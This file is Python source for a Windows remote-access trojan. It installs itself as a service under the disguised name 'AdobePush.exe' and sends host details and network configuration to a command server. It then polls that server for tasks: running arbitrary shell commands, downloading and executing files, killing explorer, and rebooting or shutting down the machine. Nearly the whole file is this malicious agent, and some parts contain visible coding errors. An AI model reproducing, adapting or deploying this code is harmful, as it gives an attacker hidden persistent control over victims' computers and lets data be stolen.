# -*- coding: utf-8 -*-
import shutil, sys, os

if(sys.argv[0] != 'C:\\Windows\\AdobePush.exe'):
	shutil.copy2(sys.argv[0], 'C:\\Windows\\AdobePush.exe')
	os.popen('sc create AdobePush binpath= "C:\Windows\AdobePush.exe"')
	os.popen('sc config AdobePush start= AUTO')

if(os.path.isfile('D:\\AdobePush.exe')):
	os.remove('D:\\AdobePush.exe')

"""
if(sys.argv[0] == 'C:\\Windows\\AdobePush.exe' or os.path.isfile('C:\\Windows\\AdobePush.exe')):
	pass
else:
	shutil.copy2(sys.argv[0], os.path.expanduser('~') + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AdobePush.exe')
"""

import threading, requests, base64, socket, time

ServerHost = ''
SEC = ''

threads = []

timeout = 10
headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.3202.62 Safari/537.36'
}

download_save_path = 'D:\\DOWNLOADER.TMP'
config_save_path = 'C:\\Users\\Public\\Intel'

def random_str(randomlength = 32):
	import random
	string = ''
	chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
	length = len(chars) - 1
	tmp = random.Random()
	for i in range(randomlength):
		string += chars[random.randint(0, length)]
	return string

if(os.path.isfile(config_save_path + '\\Config.json')):
	ACK = open(config_save_path + '\\Config.json').read()
else:
	ACK = random_str()
	if(os.path.exists(config_save_path)):
		open(config_save_path + '\\Config.json', 'w').write(ACK)
	else:
		os.makedirs(config_save_path)
		open(config_save_path + '\\Config.json', 'w').write(ACK)

def get_now_time():
	return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))

def print_debug_info(info):
	print('[%s] %s' % (get_now_time(), info))

def get_pid(taskname):
	return [item.split()[1] for item in os.popen('tasklist').read().splitlines()[4:] if process_name in item.split()]

def get_public_ip():
	try:
		r = requests.get('https://api.ip.sb/ip', headers = headers, timeout = timeout)
	except:
		return '0.0.0.0'
	else:
		return r.text

def get_ipconfig():
	return os.popen('ipconfig /all').read().decode('gbk').encode('utf-8')

def check_internet_on():
	try:
		requests.get('http://httpbin.org', headers = headers, timeout = timeout)
	except:
		return False
	else:
		return True

def get_commands():
	try:
		data = {
			'ACK': ACK,
			'SEC': SEC,
			'HOT': socket.getfqdn(socket.gethostname()),
			'SIP': socket.gethostbyname(socket.getfqdn(socket.gethostname())),
			'IPC': base64.b64encode(get_ipconfig()),
		}
		r = requests.post(ServerHost + '/Api/Commands/Get', headers = headers, data = data, timeout = timeout)
	except:
		return []
	else:
		return r.json()['RES']

def fin_commands(cid, res):
	res = base64.b64encode(res)
	try:
		data = {
			'ACK': ACK,
			'SEC': SEC,
			'CID': cid,
			'RES': res,
		}
		r = requests.post(ServerHost + '/Api/Commands/Fin', headers = headers, data = data, timeout = timeout)
	except:
		return False
	else:
		return r.json()['RES']

def shell_execute(filepath, args):
	win32api.ShellExecute(0, 'open', filepath, args, '', 0)

def shell_execute_threads(filepath, args):
	threads.append(threading.Thread(target = shell_execute, args = (filepath, args)))
	t = len(threads)
	threads[t - 1].setDaemon(True)
	threads[t - 1].start()

def RunCMD(info):
	info = base64.b64decode(info)
	return os.popen(info).read().decode('gbk').encode('utf-8')

def ShellExecute(info, is_threads = False):
	if(is_threads):
		info = base64.b64decode(info)
		os.popen(info)
	else:
		threads.append(threading.Thread(target = shell_execute, args = (info, True)))
		threads[count(threads) - 1].setDaemon(True)
		threads[count(threads) - 1].start()
		return '命令已执行'

def Downloader(info, is_threads = False):
	if(is_threads):
		try:
			r = requests.get(info, timeout = 30)
		except:
			return False
		else:
			open(download_save_path, 'wb').write(r.content)
			shutil.copy2(download_save_path, 'D:\\execute.exe')
			return True
	else:
		info = base64.b64decode(info)
		try:
			r = requests.get(info, timeout = 30)
		except:
			return '下载失败，网络超时'
		else:
			open(download_save_path, 'wb').write(r.content)
			return '下载成功，已保存至 %s' % download_save_path


def Downloader2Execute(info):
	info = base64.b64decode(info)
	if(Downloader(info, True)):
		return ShellExecute(base64.b64encode('D:\\execute.exe', True))
	else:
		return '文件下载失败'

def RebootExplorer(info):
	ShellExecute(base64.b64encode('taskkill /F /IM explorer'))
	ShellExecute(base64.b64encode('explorer.exe'))
	return '执行成功'

def ShutdownExplorer(info):
	return ShellExecute(base64.b64encode('taskkill /F /IM explorer'))

def StartExplorer(info):
	return ShellExecute(base64.b64encode('explorer.exe'))

def Reboot(info):
	info = base64.b64decode(info)
	os.popen('shutdown /r /t %i' % (int(info) + 10))
	return '重启将在 %i 秒内执行' % (int(info) + 10)

def Shutdown(info):
	info = base64.b64decode(info)
	os.popen('shutdown /s /t %i' % (int(info) + 10))
	return '关机将在 %i 秒内执行' % (int(info) + 10)

while 1:
	for item in get_commands():
		if(item['act'] == 'RunCMD'):
			res = RunCMD(item['tex'])
		elif(item['act'] == 'ShellExecute'):
			res = ShellExecute(item['tex'])
		elif(item['act'] == 'Downloader'):
			res = Downloader(item['tex'])
		elif(item['act'] == 'Downloader2Execute'):
			res = Downloader2Execute(item['tex'])
		elif(item['act'] == 'RebootExplorer'):
			res = RebootExplorer(item['tex'])
		elif(item['act'] == 'ShutdownExplorer'):
			res = ShutdownExplorer(item['tex'])
		elif(item['act'] == 'StartExplorer'):
			res = StartExplorer(item['tex'])
		elif(item['act'] == 'Reboot'):
			res = Reboot(item['tex'])
		elif(item['act'] == 'Shutdown'):
			res = Shutdown(item['tex'])
		else:
			pass
		fin_commands(item['cid'], res)
	time.sleep(10)